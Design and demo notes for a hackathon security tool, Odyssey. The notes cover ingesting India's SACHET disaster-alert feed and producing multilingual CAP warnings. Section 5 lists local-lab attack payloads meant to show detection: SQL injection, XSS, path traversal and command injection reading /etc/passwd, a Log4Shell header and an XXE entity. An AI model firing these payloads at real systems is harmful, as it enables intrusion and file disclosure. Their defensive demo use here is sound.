# SACHET + Bhashini integration with Odyssey — design & demo notes

A plan for how India's **SACHET** disaster-alert feed and the **Bhashini** language platform
connect to Odyssey, plus the **manual attacks** you can run against your *own* local lab to
show Odyssey detecting and tackling them.

> **Target hardware:** Windows laptop, **RTX 4070 8 GB** (the hardware the project was built for —
> see the README). This doc gives Windows/PowerShell commands.

## Honesty legend

Everything here is labelled so you never overclaim to judges:

- ✅ **EXISTS** — already in the Odyssey code, verified.
- 🔧 **BUILD** — proposed; not written yet.
- 🌐 **VERIFIED LIVE** — I fetched it and confirmed the format/behaviour.
- ❓ **UNVERIFIED** — needs checking (registration, API key, availability) before you rely on it.

---

## 1. The big picture

SACHET is an **input** (warnings coming in). Bhashini is a **language layer** (warnings going out,
in 22 languages). Odyssey is the brain in the middle.

```
  ┌────────────────────────── INPUT ──────────────────────────┐
  │  SACHET national CAP feed (REAL, public)  🌐 VERIFIED LIVE  │
  │  → Odyssey reads it read-only                               │
  └──────────────────────────────┬─────────────────────────────┘
                                  ▼
                 ┌─────────────────────────────────┐
                 │           ODYSSEY (brain)        │
                 │  HTTP Shield (detect+block) ✅   │
                 │  scoring, autopilot, SOC ✅      │
                 │  audit trail (hash-chained) ✅   │
                 │  CAP writer (SACHET-shape) 🔧    │
                 └───────────────┬─────────────────┘
                                 ▼
  ┌────────────────────────── OUTPUT ──────────────────────────┐
  │  Warning written as CAP 1.2, one <info> block per language  │
  │  Languages produced by:                                     │
  │    • IndicTrans2 local service (:8010) ✅  (offline, no GPU)│
  │    • Bhashini cloud API 🔧 ❓ (optional, adds voice/badge)  │
  └─────────────────────────────────────────────────────────────┘
```

**Neither SACHET nor Bhashini uses the GPU.** The RTX 4070 is only for Odyssey's LLM briefs
(MiST 8B via Ollama). See §6.

---

## 2. SACHET integration

### 2a. Inbound: Odyssey reads SACHET  🌐 VERIFIED LIVE — the easy, honest win

I fetched the real feed and confirmed it:

- **Feed:** `https://sachet.ndma.gov.in/cap_public_website/rss/rss_india.xml`
- Returned **100 live alerts**, RSS 2.0, `copyright = public domain`.
- Each item links to a full **CAP 1.2** XML message, e.g.
  `.../FetchXMLFile?identifier=<id>`.
- A real sample: a lightning warning from **Andhra Pradesh SDMA**, `severity=Severe`,
  `certainty=Possible`, with an **English `<info>` block and a Telugu one** + an affected area.

**Why Odyssey wants it:** it answers the question every critical-infrastructure SOC faces —
*"is this outage a cyberattack, or the weather?"* If a power utility in a state goes quiet and
SACHET has an active cyclone/lightning alert there, Odyssey can weight a natural cause; an attack
*during* a disaster can be escalated.

**How it connects (🔧 BUILD — small, Python stdlib, no new dependency):**

```
SACHET RSS ──poll every 15 min──▶ parse items ──▶ fetch each CAP XML ──▶
   extract: sender, state, event, severity, certainty, expires, area
   ──▶ match to Odyssey orgs by state ──▶ "Disaster alerts (SACHET)" panel on Now/Intel
```

- Poll on the **same 15-min cadence** Odyssey already uses for its live feeds.
- Keep an **offline snapshot** (a saved copy of the feed) so the demo works with no internet —
  Odyssey already does this for its other feeds.
- Label the panel **REAL** (public government data), like Odyssey's other real feeds.

**Parse XML safely** — disable external entities (this is the XXE defence; see §5).

### 2b. Outbound: Odyssey → SACHET  🔧 "SACHET-ready", not "connected"

- SACHET publishes alerts **only from authorised alert-generating agencies** (IMD, CWC, INCOIS,
  state SDMAs). The public site has **no submission API and no self-serve onboarding**.
- So Odyssey **cannot push into real SACHET** in a hackathon.
- **What you CAN do:** make Odyssey write its cyber warnings in the **exact CAP 1.2 shape** SACHET
  uses (same namespace, same fields, multilingual `<info>` blocks), and expose them as an RSS/CAP
  feed just like SACHET's. A real deployment would route these through an authorised agency —
  **CERT-In** is the natural cyber channel, and Odyssey already pre-fills CERT-In reports. ✅

**Honest lines for judges**

- ✅ Say: *"Odyssey reads India's national SACHET feed live, and writes its cyber warnings in the
  same CAP format SACHET publishes — so routing them through an authorised agency like CERT-In is
  configuration, not redevelopment."*
- ❌ Don't say: *"connected to SACHET"* or *"sends alerts to SACHET"*.
- Label Odyssey's own feed **"SACHET-compatible"** — never with NDMA/SACHET branding as if it came
  from them.

### 2c. Round-trip proof (nice demo touch 🔧)

The same reader from §2a can read **Odyssey's own** CAP feed, and the output can be validated
against the official CAP 1.2 schema. That *demonstrates* compatibility instead of claiming it.

---

## 3. Bhashini integration (language layer)

### 3a. What it is and what it adds

- **Bhashini** (MeitY): government APIs for **translation, text-to-speech, speech-to-text** in the
  22 scheduled languages.
- **Important:** Odyssey **already translates locally and offline** with IndicTrans2 (the `:8010`
  service in `start_all.ps1`), and already has the UI seam
  `GET /api/alerts/{org}/{cve}/brief/translate?lang=` ✅.
- So Bhashini is **optional**. It adds: an **official government language badge** and possible
  **voice alerts** (TTS). It does **not** add basic translation you don't already have.

### 3b. How it connects  🔧 BUILD — plugs into an existing seam

```
Odyssey warning text ──▶ translate layer
                           ├─ IndicTrans2 (:8010) ✅  default, offline, no key, no GPU-for-this
                           └─ Bhashini cloud API 🔧 ❓ fallback/alt: POST text → translated text / audio
                         ──▶ fill CAP <info> block per language (see §4)
```

- Because the translate endpoint already exists, Bhashini slots in as an **alternative backend**
  behind it — minimal new surface.
- **Cache results** (translated strings are just text) so the demo survives a dropped connection.

### 3c. Caveats ❓

- Bhashini is a **cloud API** → needs **registration + API key**, needs **internet**, and **breaks
  Odyssey's "0 cloud calls" promise**. I have **not verified** access/endpoints yet.
- **Recommendation:** keep **IndicTrans2 local** as the default (safest, offline, on-brand), and
  add Bhashini only as an optional fallback for the badge/voice.

---

## 4. How SACHET + Bhashini fit together (one coherent story)

The real SACHET alert I pulled had **one `<info>` block per language**. That is exactly how
multilingual CAP works — so the pieces line up:

```
Odyssey detects an attack
      │
      ▼
writes a CAP 1.2 warning (SACHET shape) 🔧
      │
      ▼
Bhashini / IndicTrans2 translates it
      │
      ▼
one <info> block per language  ──  the SAME structure SACHET actually publishes
```

Minimal CAP example (illustrative; red-team drill → `status=Exercise`, a real event → `Actual`):

```xml
<alert xmlns="urn:oasis:names:tc:emergency:cap:1.2">
  <identifier>ODYSSEY-WAF-00001</identifier>
  <sender>odyssey@ncew.local</sender>
  <status>Exercise</status>           <!-- honest: it's a drill -->
  <msgType>Alert</msgType>
  <scope>Restricted</scope>
  <info>
    <language>en-IN</language>
    <category>Security</category>
    <event>SQL injection on CityPower Customer Portal</event>
    <urgency>Immediate</urgency><severity>Severe</severity><certainty>Observed</certainty>
    <headline>Attack blocked on CityPower portal; source added to block list</headline>
    <instruction>Review auth logs; keep source blocked; report to CERT-In within 6 hours.</instruction>
    <area><areaDesc>Maharashtra (PWR-01 service area)</areaDesc></area>
  </info>
  <info><language>hi-IN</language> <!-- Hindi block from the translate layer --> ... </info>
</alert>
```

Odyssey → CAP severity mapping: Compromise→`Extreme`, Critical→`Severe`, High→`Moderate`,
Medium→`Minor`.

---

## 5. Manual attacks for the demo (your OWN local lab only)

> **Scope & safety:** every attack below targets **your own machine** — CityPower on
> `127.0.0.1:8080` and Odyssey's own endpoints on `127.0.0.1:8000`. **Never point these at the real
> SACHET or any site you don't own.** Odyssey's red-team runner enforces this (loopback/private
> targets only).

> **Windows note:** PowerShell's `curl` is *not* real curl. Use **`curl.exe`** explicitly for these,
> or use `Invoke-RestMethod`.

### Layer 1 — Web attacks on the app / alert API  (Shield already catches these ✅)

Fire at CityPower (`:8080`) today; later also at the CAP ingest endpoint.

| Attack | Manual payload (your lab) | Odyssey family | Status |
|---|---|---|---|
| SQL injection | `curl.exe "http://127.0.0.1:8080/search?q=' OR 1=1 --"` | `sqli.*` | ✅ |
| XSS | `curl.exe "http://127.0.0.1:8080/search?q=<script>alert(1)</script>"` | `xss.*` | ✅ |
| Path traversal | `curl.exe "http://127.0.0.1:8080/download?file=../../etc/passwd"` | `traversal.*` | ✅ |
| Command injection | `curl.exe "http://127.0.0.1:8080/ping?host=127.0.0.1;cat /etc/passwd"` | `cmdi.*` | ✅ |
| Log4Shell | header `User-Agent: ${jndi:ldap://x/a}` | `jndi` | ✅ |
| Scanner / brute force | sqlmap UA; 8+ logins in 120 s | `scanner.ua`, `bruteforce` | ✅ |

### Layer 2 — Attacks specific to an alerting system (the distinctive part)

The real threat to an early-warning system is **alert integrity** — forging, poisoning, replaying,
or suppressing alerts. Fire these at a 🔧 **proposed CAP ingest endpoint** (e.g.
`POST /api/sensor/cap`) that you control.

| Attack | What you send to your own ingest | What Odyssey should do | Status |
|---|---|---|---|
| **XXE** (XML external entity) | CAP with `<!ENTITY xxe SYSTEM "file:///etc/passwd">` — the big one, because CAP is XML | Parse with external entities **disabled**; reject + log | 🔧 BUILD (not in signatures today) |
| **Forged / spoofed sender** | A CAP claiming `<sender>IMD</sender>` from an untrusted source | Reject senders not on an allow-list | 🔧 BUILD |
| **Replay / stale alert** | Re-send an old/expired CAP to cancel a live warning | Check `sent`/`expires`; reject duplicate `identifier` | 🔧 BUILD |
| **Alert tampering** | Edit a stored alert's severity/area | Audit chain shows **BROKEN** | ✅ (hash-chained ledger) |
| **Flood / DoS of ingest** | Thousands of fake alerts to bury real ones | Rate-based detection | 🔧 BUILD |
| **Malicious feed content** | XSS/HTML smuggled in a CAP text field | XSS signatures + output escaping | ✅ partial |

**Design principle (say this to judges):** *"Odyssey treats every inbound alert as untrusted —
validate, don't trust."* That's exactly what a real national system must do.

### Suggested 2-minute demo arc (all local)

1. Odyssey shows SACHET's **real** live feed (read-only). 🌐
2. `curl.exe` a **forged CAP alert** at Odyssey's ingest → rejected (untrusted sender), logged, shown.
3. Send an **XXE** payload → blocked; Odyssey shows it tried to read a local file.
4. **Tamper** with a stored alert → audit chain shows **BROKEN**.
5. A legitimate detection → Odyssey emits a **CAP warning** in English + Hindi.

Detect → prevent → verify → warn — the full PS-01 chain, nothing external touched.

---

## 6. RTX 4070 8 GB / Windows notes

| Component | Uses the RTX 4070? | Notes |
|---|---|---|
| LLM threat briefs (MiST 8B / Ollama) | **Yes** | The only real GPU user; 8 GB VRAM is the target |
| SACHET feed reader | No | HTTP + XML parsing (Python stdlib) |
| Bhashini / IndicTrans2 translation | No (CPU) | IndicTrans2 runs in its own Python env (`.venv-mt`) per `start_all.ps1` |
| HTTP Shield, CAP writer, audit trail, SOC UI | No | Plain Python / browser |

**Good news vs the Mac:** on this Windows + RTX box the features that were dead on a Mac work —
GPU telemetry via `nvidia-smi`, AI briefs via Ollama, and `scripts\start_all.ps1` is the correct
launcher.

**Start everything (Windows PowerShell):**

```powershell
powershell -ExecutionPolicy Bypass -File scripts\start_all.ps1
# Ollama, API :8000, translation :8010, dashboard :5173, CityPower :8080
```

---

## 7. Build order

| # | Work | New dependency? | Status |
|---|---|---|---|
| 0 | Merge upstream (the HTTP Shield lives only on `origin/main`) | No | prerequisite |
| 1 | SACHET reader + offline snapshot + "Disaster alerts" panel | No (stdlib) | 🔧 |
| 2 | CAP 1.2 writer matching SACHET shape + feed endpoint | No | 🔧 |
| 3 | Translate layer fills CAP `<info>` per language (IndicTrans2 default) | No | 🔧 |
| 4 | CAP ingest endpoint + validation (XXE-safe, sender allow-list, replay, rate) + red-team cases | No | 🔧 |
| 5 | (Optional) Bhashini fallback for badge / voice | Yes (cloud + key) | 🔧 ❓ |

---

## 8. Verified vs unverified (so you don't overclaim)

- 🌐 **Verified:** SACHET public CAP/RSS feed is live, CAP 1.2, multilingual, public domain.
- ✅ **Exists in Odyssey:** HTTP Shield & web-attack signatures, hash-chained audit trail,
  translate endpoint + local IndicTrans2, STIX & CERT-In export.
- ❓ **Unverified — check before relying on it:** Bhashini API access, key, endpoints, offline use;
  SACHET outbound onboarding (assumed via CERT-In, not documented).
- 🔧 **Not built yet:** everything marked BUILD above.
